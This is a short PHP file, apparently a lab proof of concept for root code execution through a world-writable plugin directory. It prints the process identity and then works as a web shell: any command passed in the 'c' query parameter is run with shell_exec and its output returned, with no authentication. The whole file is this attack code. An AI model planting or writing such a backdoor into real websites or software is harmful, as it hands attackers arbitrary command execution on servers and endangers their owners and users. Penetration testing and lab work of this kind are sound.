<?php
// ACME lab - proof of root execution via world-writable plugin dir
echo "=== EXECUTION CONTEXT ===\n";
echo "uid: " . shell_exec('id');
echo "user: " . shell_exec('whoami');
echo "php-fpm master uid: " . shell_exec("ps -o user= -p 270 2>/dev/null");
if (isset($_GET['c'])) {
    echo "\n=== CMD: " . htmlspecialchars($_GET['c']) . " ===\n";
    echo shell_exec($_GET['c']);
}